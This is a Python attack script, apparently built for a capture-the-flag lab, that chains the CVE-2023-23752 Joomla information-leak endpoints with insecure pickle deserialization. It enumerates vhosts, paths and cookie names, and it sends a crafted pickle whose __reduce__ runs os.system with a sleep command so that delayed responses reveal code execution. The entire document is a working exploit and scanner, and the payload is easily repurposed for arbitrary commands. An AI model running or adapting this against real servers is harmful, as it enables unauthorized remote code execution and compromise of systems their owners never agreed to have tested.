#!/usr/bin/env python3
"""
Voyage pivot helper
Goal: from confirmed CVE-2023-23752 leak to real RCE trigger endpoint.

What it does:
1) Enumerate likely vhosts using Host header
2) Enumerate likely paths
3) Run time-based pickle trigger test (sleep 7)
4) Report endpoints/cookie names that actually execute payloads

Run on AttackBox:
  python3 leak_to_rce_pivot.py --target 10.82.166.188
"""

import argparse
import os
import pickle
import binascii
import time
import requests

DEFAULT_VHOSTS = [
    "tourism.thm",
    "www.tourism.thm",
    "admin.tourism.thm",
    "api.tourism.thm",
    "internal.tourism.thm",
    "dev.tourism.thm",
    "staging.tourism.thm",
    "dashboard.tourism.thm",
    "portal.tourism.thm",
    "app.tourism.thm",
    "voyage.thm",
]

DEFAULT_PATHS = [
    "/",
    "/index.php",
    "/administrator/",
    "/administrator/index.php",
    "/api/index.php/v1/config/application?public=true",
    "/api/index.php/v1/users?public=true",
    "/index.php/component/users/reset?Itemid=101",
    "/index.php/component/users/remind?Itemid=101",
    "/dashboard",
    "/portal",
    "/app",
    "/internal",
    "/dev",
    "/preview",
    "/report",
    "/reports",
    "/finance",
    "/revenue",
    "/pickle",
    "/serialize",
]

COOKIE_CANDIDATES = [
    "userData",
    "user_data",
    "user",
    "session",
    "PHPSESSID",
    "auth",
    "profile",
    "prefs",
    "data",
    "remember",
]


def mk_sleep_payload(seconds: int = 7) -> str:
    class X:
        def __reduce__(self):
            return os.system, (f"sleep {seconds}",)

    raw = pickle.dumps({"user": X(), "revenue": "999999"}, protocol=4)
    return binascii.hexlify(raw).decode()


def request_with_cookie(base_url: str, path: str, cookie_name: str, cookie_value: str, host_header: str = None, timeout: int = 20):
    s = requests.Session()
    s.cookies.set(cookie_name, cookie_value)
    headers = {}
    if host_header:
        headers["Host"] = host_header
    t0 = time.time()
    r = s.get(base_url + path, headers=headers, timeout=timeout, allow_redirects=True)
    dt = time.time() - t0
    return r.status_code, len(r.text), dt


def baseline_time(base_url: str, path: str, host_header: str = None) -> float:
    headers = {}
    if host_header:
        headers["Host"] = host_header
    t0 = time.time()
    requests.get(base_url + path, headers=headers, timeout=12, allow_redirects=True)
    return time.time() - t0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="Target IP, e.g. 10.82.166.188")
    ap.add_argument("--sleep", type=int, default=7, help="Sleep seconds in payload")
    args = ap.parse_args()

    base = f"http://{args.target}"
    sleep_payload = mk_sleep_payload(args.sleep)

    print("\n" + "=" * 72)
    print("Leak -> RCE Pivot Scanner")
    print("=" * 72)
    print(f"[*] Target: {base}")
    print(f"[*] Payload sleep: {args.sleep}s")

    hits = []

    host_candidates = [None] + DEFAULT_VHOSTS

    for host in host_candidates:
        host_label = host if host else "(no Host override)"
        print(f"\n[*] Testing host: {host_label}")

        for path in DEFAULT_PATHS:
            try:
                base_dt = baseline_time(base, path, host)
            except Exception:
                continue

            for cname in COOKIE_CANDIDATES:
                try:
                    code, length, dt = request_with_cookie(base, path, cname, sleep_payload, host)
                except Exception:
                    continue

                # Time-based trigger condition
                if dt - base_dt >= (args.sleep - 1):
                    hit = {
                        "host": host_label,
                        "path": path,
                        "cookie": cname,
                        "code": code,
                        "baseline": round(base_dt, 2),
                        "observed": round(dt, 2),
                    }
                    hits.append(hit)
                    print(f"[HIT] host={host_label} path={path} cookie={cname} base={base_dt:.2f}s now={dt:.2f}s code={code}")

    print("\n" + "=" * 72)
    print("Result")
    print("=" * 72)

    if not hits:
        print("[-] No time-based pickle trigger found on tested hosts/paths.")
        print("[!] Means: current surface likely not the deserialization endpoint yet.")
        print("[!] Next: pivot/internal discovery from first foothold or different room stage endpoint.")
    else:
        print(f"[+] Found {len(hits)} trigger candidate(s):")
        for h in hits:
            print(f"    host={h['host']} path={h['path']} cookie={h['cookie']} base={h['baseline']}s now={h['observed']}s")


if __name__ == "__main__":
    main()
